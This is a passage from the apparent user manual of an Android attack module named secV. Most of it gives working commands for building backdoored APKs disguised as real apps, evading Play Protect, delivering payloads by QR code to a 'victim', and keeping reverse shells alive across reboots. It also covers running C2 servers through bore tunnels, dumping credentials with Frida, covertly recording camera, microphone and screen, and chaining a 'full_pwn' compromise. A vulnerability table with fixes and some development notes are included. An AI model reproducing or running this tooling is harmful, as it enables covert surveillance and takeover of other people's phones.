  --lhost 192.168.1.42 --lport 8888

# Android Intent URI (opens app, triggers action)
secv android --operation qr_exploit --qr-mode intent

# ADB wireless pairing (Android 11+)
secv android --operation qr_exploit --qr-mode adb_pair \
  --pair-port 37001 --pair-code 123456

# Custom deep link
secv android --operation qr_exploit --qr-mode deeplink
```

**WAN mode** - bore tunnel + detached HTTP server + QR encodes the bore public URL:
```bash
secv android --operation qr_exploit --qr-mode apk --mode wan
# The victim scans the QR, downloads the APK from bore.pub:<port>/payload.apk
# No port forwarding needed on your side
```

---

### `msf_handler` - Start Metasploit Listener

Generates a handler.rc file and starts `msfconsole` with it. The handler waits for the
payload to call back.

```bash
secv android --operation msf_handler --lhost 192.168.1.42 --lport 4444
secv android --operation msf_handler --payload android/meterpreter/reverse_https --lport 8443
```

The RC file is saved to `~/.secv/android/auto/<timestamp>/handler.rc`. You can re-run it
manually later: `msfconsole -q -r ~/.secv/android/auto/<timestamp>/handler.rc`

**`ExitOnSession false`** is always set - the handler stays up after the first session, ready
to catch more.

---

## 22. Instrumentation Operations

### `frida_hook` - Runtime Instrumentation

```bash
# SSL pinning bypass (intercept HTTPS with Burp)
secv android --operation frida_hook \
  --package com.target.app \
  --hook-mode ssl_unpin

# Root detection bypass
secv android --operation frida_hook \
  --package com.target.app \
  --hook-mode root_bypass

# Dump in-memory credentials (hooks login/auth functions)
secv android --operation frida_hook \
  --package com.target.app \
  --hook-mode dump_creds

# Trace all calls to a class
secv android --operation frida_hook \
  --package com.target.app \
  --hook-mode trace \
  --trace-method com.target.app.auth.LoginManager \
  --hook-timeout 60

# All hooks at once
secv android --operation frida_hook \
  --package com.target.app \
  --hook-mode all
```

**How the operation works:**
1. Downloads the correct frida-server binary for the device architecture
2. Pushes it to `/data/local/tmp/frida-server`
3. Starts it on the device (`adb shell /data/local/tmp/frida-server &`)
4. Runs `frida -U -n <package> -l <script.js>` on your machine
5. The script hooks the target functions
6. Keeps running for `--hook-timeout` seconds, then detaches

---

### `objection_patch` - Gadget Injection

**When to use this instead of `frida_hook`:** When the device is not rooted and you cannot
run frida-server. Objection patches the APK to include the Frida gadget as a native library
that loads when the app starts - no frida-server needed.

```bash
secv android --operation objection_patch --package com.target.app
```

**Trade-off:** The APK must be reinstalled. The original app must be uninstalled first (or
the patched APK installed over it if signatures match - they won't unless you control the
keystore). Some apps detect tampered signatures.

---

### `process_inject` - Process Injection

Injects a payload into a running process on a rooted device using `/proc/pid/mem` writes
or ptrace-based injection.

```bash
secv android --operation process_inject --package com.target.app
```

---

### `lsposed_hook` - LSPosed Framework Hook

Generates an LSPosed module that hooks the target app at the Zygote/framework level - before
the app even starts. More powerful than Frida for persistent hooks.

```bash
secv android --operation lsposed_hook --package com.target.app
```

**Requires:** LSPosed or EdXposed framework installed on device.

---

### `unhook` - Remove Hooks

Detaches Frida, removes the gadget from patched APKs, restores originals from backup.

```bash
secv android --operation unhook --package com.target.app
```

---

## 23. Persistence Operations

### `persist` - Boot Receiver Persistence

**The goal:** Make your payload survive device reboots without root.

**How it works:** Android allows any app to declare a `BroadcastReceiver` for the
`BOOT_COMPLETED` action. When the phone boots, the system sends this broadcast to all
registered receivers. Your receiver starts a Service that opens a reverse shell back to you.

This requires the user to have installed the payload app. No root needed. The `allowBackup`
flag does not matter - the receiver is in the manifest.

```bash
secv android --operation persist --lhost 192.168.1.42 --lport 4444
```

**With Magisk (root):** Also installs a Magisk module with a `post-fs-data.d/` script for
earlier startup execution, before the Android framework is fully up.

**For WAN persistence with no port forwarding**, use `rebuild` instead (Chapter 29).

---

## 24. C2 & Agent Operations

### `inject_agent` - Native Agent Deployment

**What it does:** Pushes a compiled agent binary to the device, executes it, and receives
its callback.

**Agent types:**
- `secv_agent.sh` - Shell script. Works on any Android, no compilation. Sends JSON recon data.
- `secv_agent` (compiled C binary) - Built with Android NDK for ARM64. Faster, smaller,
  less visible in `ps` output.

**Agent modes:**

```bash
# Recon mode - receive JSON device profile
secv android --operation inject_agent \
  --agent-mode recon \
  --c2-host 192.168.1.42 \
  --c2-port 8889

# Exploit mode - agent tries to escalate, then callback
secv android --operation inject_agent \
  --agent-mode exploit \
  --escalate true \
  --c2-host 192.168.1.42 \
  --c2-port 8889

# Full C2 mode - persistent agent, receives commands in a loop
secv android --operation inject_agent \
  --agent-mode c2 \
  --c2-host 192.168.1.42 \
  --c2-port 8889 \
  --c2-timeout 30
```

**C2 server (separate terminal):**
```bash
python3 tools/mobile/android/agent/c2_server.py --auto-exploit --lhost 192.168.1.42
```

---

### `c2_gui` - C2 Web Dashboard

Starts the standalone C2 dashboard (`c2_gui.py`). Also accessible as the C2 tab inside
the main GUI.

```bash
secv android --operation c2_gui --c2-port 8889
# Open http://127.0.0.1:8889
```

**Dashboard features:**
- Session list with status and device info
- bore tunnel status (live/dead, port assignments)
- MSF session log (streamed from msfconsole)
- QR code generator for APK delivery
- Operations launcher (run any operation from the dashboard)
- Encrypted session logs - .scv files with 5-layer encryption (PBKDF2 + SHA3 + Scrypt + AES-GCM + ChaCha20)

---

### `c2_cli` - Headless C2 Server

C2 without the browser UI.

```bash
secv android --operation c2_cli --c2-port 8889
```

---

## 25. Evasion & Customization Operations

See Chapter 21 (`bypass_play_protect`, `customize_apk`) - they are listed there because
they are typically part of the payload delivery pipeline.

The **Evasion & Customization** sidebar group is where these appear in the GUI. They are
documented fully in the Payload & Delivery section above.

---

## 26. Live Media Operations

### Screen Mirror

The screen mirror captures the device display and shows it in the browser in real time.

**Source: ADB (recommended, no payload needed)**

The ADB path uses `screenrecord` → `ffmpeg` → MJPEG multipart stream:
```
adb exec-out screenrecord --output-format=h264 --time-limit=0 - | ffmpeg -i pipe:0 -f image2pipe -vcodec mjpeg pipe:1
```
- If `ffmpeg` is available: ~15 fps, JPEG quality 3
- If only ADB is available: falls back to `adb exec-out screencap -p` loop, ~5 fps

**Source: MSF (Meterpreter session required)**

Polls Meterpreter's `screenshot` command every 3 seconds and updates the displayed image.
Slower (0.3 fps) but works over any session, including WAN.

**Aspect ratio auto-detection:**

Before streaming, the GUI fetches `/api/media/screen/size` which runs `adb shell wm size`.
This returns the physical resolution (e.g. `1080x2400`) and the wrap container is sized to
match, so the image is not stretched or letterboxed incorrectly.

```bash
secv android screen_mirror --source adb --serial <serial>
secv android screen_mirror --source msf --session 1
```

**GUI usage:** Live tab → **⟳ Size** (auto-detects dimensions) → select source → **▶ Start**

---

### Camera Snap & Stream

```bash
# Single frame (ADB: opens camera app, screencaps)
secv android camera_snap --cam-id 0 --source adb
secv android camera_snap --cam-id 1 --source msf --session 1  # front camera via MSF

# Live stream (ADB: screencap loop, no payload)
secv android camera_stream --source adb --cam-id 0

# Live stream (MSF: requires webcam_stream running in session)
# In MSF: sessions -i 1; webcam_stream -l 0.0.0.0 -p 8880 -i 1
secv android camera_stream --source msf --port 8880
```

---

### Microphone Recording

```bash
# ADB: uses tinycap (Android's audio capture tool) in timed chunks
secv android mic_record --source adb --duration 5

# MSF: triggers record_mic in Meterpreter session
# In MSF: sessions -i 1; record_mic -d 10
secv android mic_record --source msf --session 1 --duration 10
```

Recordings saved to `~/.secv/android/media/mic_*.wav`. Playable in the GUI audio player.

---

### Speaker Control

```bash
# Push audio file to device and play it
secv android speaker_push --file /path/to/audio.mp3

# Stop playback
secv android speaker_push --stop
```

The module pushes the file to `/sdcard/secv_spk.<ext>` then sends an Android media intent to
play it. Stop: sends `KEYCODE_MEDIA_STOP` and force-stops known player packages.

---

## 27. Automated Chain Operations

### `full_pwn` - Complete Automated Compromise

Chains seven operations sequentially, each feeding its results into the next:

```
recon → adb_wifi → get_root → device_net_scan → deploy_shell → persist → wan_expose
```

```bash
secv android --operation full_pwn --lhost auto --lport 4444
```

If any step fails (e.g. get_root fails on a locked bootloader), the chain continues with
the remaining steps. The results of each step are in the final JSON output.

---

### `multi_device` - Parallel Operations

Runs any operation on ALL connected devices simultaneously using threading.

```bash
# Recon all devices
secv android --operation multi_device --sub-operation recon

# Deploy shell to all devices
secv android --operation multi_device --sub-operation deploy_shell --lhost auto
```

Each device gets its own session. Results are tagged with device serial numbers.

---

# Part IV - Deep Dives

## 28. The APK Build Pipeline

Every operation that produces or modifies an APK goes through this pipeline:

```
┌─────────────────┐
│  Source APK     │ ← pulled from device, or generated by msfvenom
└────────┬────────┘
         │ apktool d (decompile)
         ▼
┌─────────────────────────────────────────────────────────┐
│  Work directory                                          │
│  ├── AndroidManifest.xml                                │
│  ├── smali/  (Dalvik assembly)                          │
│  ├── res/    (icons, layouts, strings)                  │
│  └── assets/ (raw files)                                │
└────────┬────────────────────────────────────────────────┘
         │
         ├── [backdoor_apk]      inject Meterpreter smali classes
         ├── [bypass_play_protect] rename pkg, scrub manifest, add noise class
         ├── [customize_apk]     swap icons (6 densities), patch label+pkg
         │
         │ apktool b (recompile smali → classes.dex)
         ▼
┌─────────────────┐
│  unsigned.apk   │
└────────┬────────┘
         │ zipalign -v 4  (align for runtime efficiency)
         ▼
┌─────────────────┐
│  aligned.apk    │
└────────┬────────┘
         │ apksigner sign --ks secv.keystore
         ▼
┌───────────────────────────────────────────────┐
│  ~/.secv/android/payloads/<output>.apk        │
└───────────────────────────────────────────────┘
```

**Why zipalign matters:** Android requires APKs to be aligned on 4-byte boundaries for
efficient memory-mapped access. An unaligned APK will fail to install on modern Android.

**The secv.keystore:** A pre-generated keystore stored in `apk_backdoor/secv.keystore`.
It is consistent - all APKs built by this module are signed with the same certificate.
This matters because Android will not let you update an app if the new APK is signed with a
different certificate than the installed one.

---

## 29. BootBuddy and Boot Persistence

**The goal:** The payload survives reboots AND works over WAN without port forwarding.

**The problem with normal `persist`:** The Boot Receiver service opens a connection to
`LHOST:LPORT`. If LHOST is your home IP and you are behind NAT, the phone cannot reach you.
If you are on mobile data, neither can the phone.

**BootBuddy's solution:** The APK contains no Meterpreter bytecode at all. It contains only:

1. **BootReceiver** - triggers on `BOOT_COMPLETED`
2. **AgentService** - called by BootReceiver, performs two actions:
   - Writes a startup script to the device (runs once)
   - Fetches `s.dex` from a bore tunnel and loads it with `DexClassLoader`
3. **s.dex** - a Metasploit DEX file served by your machine through a bore tunnel

At boot:
```
1. BOOT_COMPLETED fires
2. BootReceiver calls AgentService
3. AgentService fetches s.dex from bore.pub:<DEX_PORT>
4. DexClassLoader loads s.dex into memory
5. s.dex opens Meterpreter connection to bore.pub:<MSF_PORT>
6. bore.pub:<MSF_PORT> forwards to your local Metasploit listener
7. Session opens
```

Because the DEX is fetched at runtime, static scanners see only a loading class - no
Meterpreter bytecode to detect.

**Building BootBuddy:**

```bash
# From module CLI
secv android --operation rebuild --lhost auto --msf true --msf-lport 4444

# Directly
python3 tools/mobile/android/apk_backdoor/build_bootbuddy.py \
  --lhost auto --msf --msf-lport 4444 --out output/bootbuddy.apk
```

**Installing:**
```bash
adb install -r output/bootbuddy.apk
# Reboot device. After reboot, check msfconsole for new session.
```

**build_bootbuddy.py arguments:**

| Argument | Default | Description |
|----------|---------|-------------|
| `--apk PATH` | pulled from device | Source APK to patch |
| `--device SERIAL` | first connected | ADB device serial |
| `--lhost IP` | auto-detected | Your IP (bore.pub for WAN) |
| `--lport PORT` | `8889` | Agent TCP C2 port |
| `--http PORT` | `8890` | Agent HTTP C2 port |
| `--msf` | off | Merge Meterpreter DEX stager |
| `--msf-lport PORT` | `4444` | Meterpreter callback port |
| `--keystore PATH` | `secv.keystore` | Signing keystore |
| `--out PATH` | `output/rebuilt.apk` | Output file |
| `--strip-shared-uid` | off | Remove `sharedUserId` from manifest |

---

## 30. WAN C2 - Working Without Port Forwarding

### The full WAN stack

```
┌─────────────────────────────────────────────────────────────────┐
│  Your machine                                                    │
│  ├── bore local 8890 --to bore.pub → bore.pub:21062  (DEX)    │
│  ├── bore local 4444 --to bore.pub → bore.pub:37993  (MSF)    │
│  ├── HTTP server serving s.dex on :8890                         │
│  └── msfconsole multi/handler on :4444                          │
└────────────────────────┬────────────────────────────────────────┘
                         │  bore.pub relays traffic
                         │
┌────────────────────────▼────────────────────────────────────────┐
│  Target Android (on 4G/5G mobile data)                          │
│  BootReceiver fires → fetches s.dex from bore.pub:21062         │
│  DexClassLoader loads s.dex → connects to bore.pub:37993        │
│  MSF session opens                                               │
└─────────────────────────────────────────────────────────────────┘
```

### Using the C2 watchdog

The watchdog manages the whole stack - bore tunnels, HTTP server, MSF handler - and
auto-restarts any component that dies.

```bash
bash tools/mobile/android/c2_persistence/c2_watchdog.sh \
  --bore-dex-port 21062 \
  --bore-msf-port 37993 \
  --msf-port 4444 \
  --dex-dir tools/mobile/android/apk_backdoor/output/
```

### As a systemd service (survives reboots of your machine)

```bash
sudo cp tools/mobile/android/c2_persistence/secv-c2.service /etc/systemd/system/
sudo systemctl enable --now secv-c2
sudo systemctl status secv-c2
```

### Via the GUI

C2 tab → **▶ Launch C2** → the dashboard shows bore tunnel status and MSF sessions live.

---

## 31. The Screen Mirror and Live Media System

### How the ADB H.264 pipeline works

```
adb exec-out screenrecord --output-format=h264 --time-limit=0 -
  └── raw H.264 stream on stdout
      └── piped to ffmpeg stdin
          ffmpeg -i pipe:0 -vf fps=15,scale=-2:720 -f image2pipe -vcodec mjpeg -q:v 3 pipe:1
            └── JPEG frames on stdout
                └── GUI server reads frames, wraps in MJPEG multipart response
                    └── browser displays as <img src="/api/media/screen">
```

The browser's `<img>` tag keeps loading from the MJPEG endpoint - this is the standard
Motion JPEG streaming technique. No WebSockets, no special protocol.

### Aspect ratio detection

When the Live tab opens (or you click **⟳ Size**), the server runs:
```
adb shell wm size
```
Which returns something like `Physical size: 1080x2400`. The server parses width and height,
returns them as JSON, and the browser JavaScript sets the container height to:
```
height = containerWidth × (height / width)  (capped at 72% of window height)
```

### MSF screenshot polling

The MSF mode uses a `setInterval` timer in the browser that fetches `/api/media/screen/msf`
every 3 seconds. The server runs `msfconsole -q -r snap.rc` with a resource file that
calls `sessions -i N; screenshot -p /path/to/file; exit`. The resulting PNG is served back
and the browser `<img>` src is updated.

---

## 32. The Embedded PTY Shell

The **Shell** tab in the GUI is a real PTY (pseudo-terminal) running your local shell.

### How it works

**Server side:**
- `pty.fork()` - forks a child process with a PTY attached
- Child exec's your shell (`zsh` → `bash` → `/bin/sh`)
- Parent reads PTY output in a thread → appends to `_pty_buf` → broadcasts to SSE clients
- `/api/pty/input` POST receives keystrokes and writes them to the PTY fd
- `/api/pty/stream` GET returns an SSE stream of PTY output

**Browser side:**
- `<input>` at the top captures keystrokes
- Pressing Enter sends them to `/api/pty/input`
- An `EventSource` connected to `/api/pty/stream` receives output and appends it to the
  output div
- ANSI color codes are parsed into `<span>` elements with inline styles

**Session ID system (prevents double output):**
- Each PTY start increments `_pty_session`
- The first SSE event is `{"pty_sid": N}`
- If the browser reconnects (EventSource auto-reconnect), it passes `?sid=N`
- The server only replays the buffer if `sid == _pty_session` (same session)
- Browser `onerror` calls `es.close()` to prevent auto-reconnect from triggering replays

---

## 33. Dependency System and Package Managers

The Deps tab shows which tools are installed and offers install commands.

**Package manager detection order:**
```python
for m in ("yay", "paru", "pacman", "dnf", "zypper", "brew", "apt"):
    if shutil.which(m):
        pkg_mgr = m
        break
```

**Install command formatting:**
- `yay`/`paru`: `yay -S <aur-package>`
- `pacman`: `pacman -S <package>`
- `dnf`: `dnf install <package>`
- `apt`: `apt install <package>`

Each tool in the Deps grid has pre-defined install commands for each package manager.
If a tool requires Python (frida-tools, objection), the install command uses `pip3 install`.
If a tool requires manual download (jadx, bore), the command shows the download URL and
install steps.

---

# Part V - Reference

## 34. Global Parameter Reference

| Parameter | Type | Default | CLI flag | Description |
|-----------|------|---------|---------|-------------|
| `operation` | string | `recon` | `--operation` | Operation to run |
| `device` | string | auto | `--device` | ADB serial |
| `package` | string | - | `--package` | Target app package name |
| `lhost` | string | auto | `--lhost` | Your IP address |
| `lport` | int | `4444` | `--lport` | Listener port |
| `payload` | string | `android/meterpreter/reverse_tcp` | `--payload` | MSF payload type |
| `install` | bool | `false` | `--install` | Auto-install APK after build |
| `deep-analysis` | bool | `false` | `--deep-analysis` | Use jadx for decompilation |
| `search-secrets` | bool | `true` | `--search-secrets` | Scan for hardcoded secrets |
| `scan-limit` | int | `5` | `--scan-limit` | Max apps for bulk scan |
| `third-party-only` | bool | `true` | `--third-party-only` | Skip system apps |
| `backup` | bool | `false` | `--backup` | Create ADB backup |
| `proxy` | bool | `false` | `--proxy` | Configure device proxy |
| `proxy-host` | string | auto | `--proxy-host` | Proxy server IP |
| `proxy-port` | int | `8080` | `--proxy-port` | Proxy port |
| `bypass-ssl` | bool | `false` | `--bypass-ssl` | Frida SSL pinning bypass |
| `nvd-api-key` | string | - | `--nvd-api-key` | NVD API key |
| `hook-mode` | string | `all` | `--hook-mode` | Frida hook type |
| `hook-timeout` | int | `30` | `--hook-timeout` | Frida session duration (s) |
| `trace-method` | string | - | `--trace-method` | Method/class to trace |
| `agent-mode` | string | `recon` | `--agent-mode` | Agent mode: recon/exploit/c2 |
| `c2-host` | string | auto | `--c2-host` | Agent callback IP |
| `c2-port` | int | `8889` | `--c2-port` | Agent callback port |
| `c2-timeout` | int | `20` | `--c2-timeout` | Agent callback wait (s) |
| `escalate` | bool | `false` | `--escalate` | Auto-escalate on agent callback |
| `qr-mode` | string | `apk` | `--qr-mode` | QR type: apk/intent/adb_pair/deeplink |
| `pair-port` | int | `37001` | `--pair-port` | ADB pairing port |
| `pair-code` | string | `123456` | `--pair-code` | ADB pairing code |
| `cve` | string | - | `--cve` | CVE to target |
| `adb-port` | int | `5555` | `--adb-port` | ADB WiFi port |
| `serve-port` | int | `8888` | `--serve-port` | HTTP APK delivery port |
| `msf` | bool | `false` | `--msf` | Merge Meterpreter into rebuild |
| `msf-lport` | int | `4444` | `--msf-lport` | Meterpreter port for rebuild |
| `mode` | string | - | `--mode` | `gui` to launch web interface |
| `gui-port` | int | `8897` | `--gui-port` | GUI server port |
| `serve` | bool | `true` | `--serve` | `false` = headless JSON output |
| `cleanup` | bool | `false` | `--cleanup` | Delete work dir after run |
| `source` | string | `adb` | `--source` | Media source: adb/msf |
| `cam-id` | int | `0` | `--cam-id` | Camera (0=back, 1=front) |
| `msf-session` | int | `1` | `--msf-session` | Meterpreter session number |
| `duration` | int | `5` | `--duration` | Mic recording duration (s) |
| `app-name` | string | `Google LLC` | `--app-name` | Signing CN for bypass |
| `fake-pkg` | string | - | `--fake-pkg` | Override package name |
| `app-label` | string | - | `--app-label` | Launcher name for customize |
| `package-name` | string | - | `--package-name` | New applicationId for customize |
| `icon-path` | string | - | `--icon-path` | Icon file/URL for customize |
| `output-name` | string | - | `--output-name` | Output APK filename |

---

## 35. Vulnerability Database

Detected vulnerabilities and their meanings:

| ID | Severity | What it means | How to fix |
|----|----------|---------------|-----------|
| `sql_injection` | CRITICAL | Content Provider query is not parameterized | Use `SQLiteDatabase.query()` with `selectionArgs[]`, never concatenate user input into query strings |
| `adb_network` | CRITICAL | `adb tcpip` is active - anyone on the network can control the device | `adb usb` to disable, or `adb shell settings put global adb_enabled 0` |
| `hardcoded_secrets` | HIGH | API keys, passwords, or tokens are in the code or assets | Store secrets server-side; use Android Keystore for device-local secrets |
| `insecure_crypto` | HIGH | DES, MD5 (for security), SHA1 (for security), or ECB mode detected | Use AES-256-GCM, SHA-256 or better, PBKDF2/bcrypt for passwords |
| `debuggable` | HIGH | `android:debuggable="true"` in the released app | Set `debuggable false` in release build variant; never ship debug builds |
| `cleartext_traffic` | HIGH | `usesCleartextTraffic="true"` or no Network Security Config | Add `<network-security-config>` with `cleartextTrafficPermitted="false"` |
| `webview_js` | HIGH | `addJavascriptInterface()` exposes Java methods to JavaScript | Use `@JavascriptInterface`, validate all JavaScript input |
| `debug_certificate` | HIGH | Signed with Android debug keystore | Generate a production keystore and sign release builds with it |
| `path_traversal` | HIGH | File paths from user input are not sanitized | Canonicalize paths, validate they stay within the intended directory |
| `backup_enabled` | MEDIUM | `allowBackup="true"` lets ADB extract all app data | Set `android:allowBackup="false"` in manifest |
| `exported_components` | MEDIUM | Activities/Services/Receivers/Providers accessible without permissions | Add `android:permission="<custom-permission>"` or `android:exported="false"` |
| `intent_hijacking` | MEDIUM | Intent extras are used without validation | Validate all extras; use explicit intents for internal communication |
| `excessive_permissions` | MEDIUM | Dangerous permissions declared beyond what the app needs | Apply least-privilege; request permissions only when needed |
| `outdated_sdk` | MEDIUM | `targetSdkVersion` below current API level | Update to target the current API level to get security improvements |
| `world_readable` | MEDIUM | Files created with `MODE_WORLD_READABLE` | Use `MODE_PRIVATE`, store sensitive files in internal storage |
| `root_detection` | INFO | Device is rooted | Root bypasses all software security controls on that device |
| `developer_mode` | INFO | Developer options are enabled | Disable on devices not being actively developed on |

---

## 36. Artifact Locations

Everything the module creates goes under `~/.secv/android/`:

```
~/.secv/android/
├── auto/
│   └── <YYYYMMDD_HHMMSS>/
│       ├── handler.rc          ← MSF multi/handler resource file
│       └── session.log         ← session events
├── payloads/
│   ├── payload.apk             ← msfvenom-generated APK
│   ├── evaded.apk              ← after bypass_play_protect
│   └── Netflix_v8.114.apk     ← after customize_apk
├── media/
│   ├── mic_0001.wav            ← ADB microphone chunk 1
│   ├── mic_0002.wav            ← chunk 2...
│   ├── mic_msf_1716000000.wav  ← MSF record_mic recording
│   └── msf_screens/
│       └── screen_1716000000.png  ← MSF screenshot
├── forensics/
│   └── <serial>/
│       ├── databases/          ← extracted SQLite files
│       ├── prefs/              ← SharedPreferences XML
│       └── logs/               ← logcat captures
└── reports/
    └── <serial>_<timestamp>.json  ← full operation report
```

The BootBuddy output is in the module directory:
```
tools/mobile/android/apk_backdoor/output/
└── rebuilt.apk     ← signed BootBuddy APK
```

---

## 37. Troubleshooting

### Device not showing up

```bash
# Check ADB server
adb kill-server && adb start-server
adb devices

# udev rule (Linux - needed on some distros)
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"' \
  | sudo tee /etc/udev/rules.d/51-android.rules
sudo udevadm control --reload-rules && sudo udevadm trigger
sudo usermod -aG plugdev $USER
# Log out and back in
```

Common vendor IDs: Google/Pixel=18d1, Samsung=04e8, OnePlus=2a70, Xiaomi=2717

### Device shows `unauthorized`

The trust dialog was dismissed or not shown. On the device:
- Developer Options → Revoke USB debugging authorizations
- Disconnect and reconnect USB
- Accept the new dialog

### APK build fails

```bash
# Clear apktool framework cache
apktool empty-framework-dir --force

# Test decompile manually
apktool d target.apk -o /tmp/test_out

# Check Java version (apktool needs Java 8+)
java -version
update-alternatives --list java   # choose the right one
```

### Frida not connecting

```bash
# Push correct architecture frida-server
adb shell getprop ro.product.cpu.abi   # get arch: arm64-v8a, armeabi-v7a, x86_64
# Download matching frida-server from https://github.com/frida/frida/releases
adb push frida-server-<ver>-android-<arch> /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &
frida-ps -U   # should list device processes
```

### Screen mirror black / no output

```bash
# Test screencap directly
adb exec-out screencap -p > /tmp/test.png
file /tmp/test.png   # should say PNG image

# Test screenrecord
adb shell screenrecord --time-limit=5 /sdcard/test.mp4
adb pull /sdcard/test.mp4

# Check ffmpeg
ffmpeg -version
```

### Double output in PTY (old sessions)

This was a known bug fixed in v2.4.2. The SSE session ID handshake prevents buffer replay
on reconnect. If it recurs: press F5 to reload the page and start a new shell.

### MSF handler not catching sessions

```bash
# Verify handler RC file
cat ~/.secv/android/auto/*/handler.rc

# Run handler manually to see errors
msfconsole -q -r ~/.secv/android/auto/*/handler.rc

# Check LHOST is reachable from device
# On device: adb shell ping <your-lhost>
```

### bore tunnel not working

```bash
# Check bore is installed
bore --version   # or: ~/.local/bin/bore --version

# Test bore manually
bore local 4444 --to bore.pub
# Should print something like: listening at bore.pub:37421

# Install bore
curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz \
  | tar xz -C ~/.local/bin
```

---

# Part VI - Contributing and Module Development

## 38. How the Module Talks to secV

The secV shell is a Go binary. It does not import Python - instead it:

1. Reads `module.json` to know what parameters the module accepts
2. Collects user-set parameters via `set key value` commands
3. Bundles everything into a JSON object and writes it to the module's stdin
4. Reads stdout from the module (either JSON or streaming text)
5. Displays the output and parses results

```json
// What the module receives on stdin:
{
  "target": "device",
  "params": {
    "operation": "recon",
    "device": "emulator-5554",
    "lhost": "192.168.1.42",
    "lport": "4444"
  }
}
```

The Python module (`android_pentest.py`) reads this, runs the operation, and prints results.

The GUI is different - `android_gui.py` is a standalone HTTP server that the module launches
directly. The GUI communicates with the browser over REST/SSE, not via secV's JSON protocol.

---

## 39. Module Architecture - Where Everything Lives

```
android_pentest.py      ← CLI entrypoint, reads stdin JSON, dispatches operations
android_gui.py          ← Web GUI server (all operations + live media)
module.json             ← secV manifest (parameters, deps, help text)
rqm.md                  ← Dependency list for install.sh
device_monitor.sh       ← ADB hot-plug daemon (auto-connects WiFi devices)
c2_gui.py               ← Standalone C2 dashboard
apk_backdoor/
  build_bootbuddy.py    ← BootBuddy APK builder
  AgentService.smali    ← Agent smali fragment injected into APKs
  secv.keystore         ← Consistent signing key (DO NOT REPLACE - breaks updates)
agent/
  secv_agent.c          ← ARM64 C agent source
  secv_agent.sh         ← Shell agent (portable fallback)
  c2_server.py          ← Agent C2 receiver
  build.sh              ← NDK cross-compile script
c2_persistence/
  c2_watchdog.sh        ← bore + MSF + HTTP server watchdog
  secv-c2.service       ← systemd unit
```

**Key data flows:**

```
secV shell → stdin JSON → android_pentest.py → operations → stdout JSON → secV shell

Browser → HTTP GET/POST /api/* → android_gui.py → operations → JSON response
Browser → EventSource /api/stream → android_gui.py → SSE output stream

BootBuddy APK → bore.pub:<DEX_PORT> → HTTP server → s.dex
s.dex → bore.pub:<MSF_PORT> → msfconsole multi/handler
```

---

## 40. Adding a New Operation

**Step 1: Write the operation in `android_pentest.py`**

All operation methods follow the same pattern. Add yours after the last operation:

```python
def _my_new_operation(self):
    # Access parameters
    target_pkg = self.params.get("package", "")
    lhost      = self.params.get("lhost", self._detect_lhost())
    serial     = self.params.get("device", "")

    # Print progress (appears in GUI terminal)
    self._print_colored("[*] Starting my_new_operation...", "cyan")

    # Do work
    result = _adb(*(["-s", serial] if serial else []), "shell", "id")

    # Return findings
    self.findings.append({
        "type": "my_finding",
        "severity": "HIGH",
        "description": "Found something",
        "value": result,
    })

    self._print_colored("[+] Done: " + result, "green")
```

**Step 2: Register the operation in `_run()`**

Near the end of `android_pentest.py`, find the operations dispatch dict and add your entry:

```python
ops = {
    "recon":          self._recon_operation,
    ...
    "my_new_op":      self._my_new_operation,   # ← add this
}
```

**Step 3: Add it to the CLI module JSON**

In `module.json`, add to `help.parameters.operation.options`:
```json
"my_new_op"
```

And to `help.parameters.operation.examples`:
```json
"my_new_op  - Brief description of what it does"
```

**Step 4: Add it to the GUI sidebar**

In `android_gui.py`, find the `OPS` JavaScript object and add your operation to the
appropriate group:

```javascript
"My Group": [
  {id:"my_new_op", label:"my new op",
   desc:"What this does, explained clearly.",
   cli:"secv android --operation my_new_op --parameter value",
   runLabel:"RUN",
   fields:[
     {n:"package", p:"", t:"text", label:"Target package"},
     {n:"lhost", p:"", t:"text", label:"LHOST"},
   ]},
],
```

**Field types:**
- `t:"text"` - free text input
- `t:"select"` - dropdown, add `opts:["opt1","opt2"]`
- `t:"checkbox"` - boolean toggle

**Step 5: Test**

```bash
# Restart the GUI server
pkill -f android_gui.py
python3 android_gui.py &

# Test CLI
secv android --operation my_new_op --package com.test.app
```

---

## 41. Adding a New GUI Panel

To add a completely new section to the Live tab (or a new tab entirely):

**In the HTML (around line 3107 in `android_gui.py`):**

```html
<!-- My New Section -->
<div class="live-section">
  <div class="live-section-hdr">
    <div class="live-dot" id="my-dot"></div>
    <div class="live-label">My Feature</div>
    <button class="live-btn go" onclick="startMyFeature()">▶ Start</button>
    <button class="live-btn active" onclick="stopMyFeature()" id="my-stop-btn" style="display:none">■ Stop</button>
  </div>
  <div id="my-content-area">
    <div id="my-placeholder">Feature off - click Start</div>
    <!-- your content here -->
  </div>
</div>
```

**In the JavaScript (after the other Live Media functions):**

```javascript
function startMyFeature() {
  const serial = _screenSerial();
  fetch('/api/my/endpoint?serial=' + encodeURIComponent(serial))
    .then(r => r.json())
    .then(d => {
      if (d.ok) {
        document.getElementById('my-dot').classList.add('on');
        document.getElementById('my-stop-btn').style.display = '';
        showToast('My feature started', 'connect', 2000);
      } else {
        showToast('Failed: ' + d.error, 'disconnect', 4000);
      }
    });
}

function stopMyFeature() {
  fetch('/api/my/endpoint/stop', {method: 'POST'})
    .then(() => {
      document.getElementById('my-dot').classList.remove('on');
      document.getElementById('my-stop-btn').style.display = 'none';
    });
}
```

---

## 42. Adding a New API Endpoint

**Step 1: Add the route in `do_GET` or `do_POST`**

```python
# In do_GET (for data retrieval):
elif p == "/api/my/endpoint":   self._api_my_endpoint()

# In do_POST (for actions):
elif p == "/api/my/action":     self._api_my_action(body)
```

**Step 2: Implement the handler method**

```python
def _api_my_endpoint(self):
    # Parse query parameters
    qs     = parse_qs(urlparse(self.path).query)
    serial = (qs.get("serial") or [""])[0]
    prefix = (["-s", serial] if serial else [])
    adb    = shutil.which("adb") or "adb"

    try:
        result = subprocess.run(
            [adb] + prefix + ["shell", "your-command"],
            capture_output=True, text=True, timeout=10
        ).stdout.strip()
        self._json({"ok": True, "result": result})
    except Exception as e:
        self._json({"ok": False, "error": str(e)})

def _api_my_action(self, body: dict):
    # body is already a dict parsed from POST JSON
    value = body.get("value", "")
    # do something
    self._json({"ok": True})
```

**Available helper methods:**
- `self._json(dict)` - send JSON response with 200 OK
- `self._cors()` - add CORS headers (call before `end_headers()`)
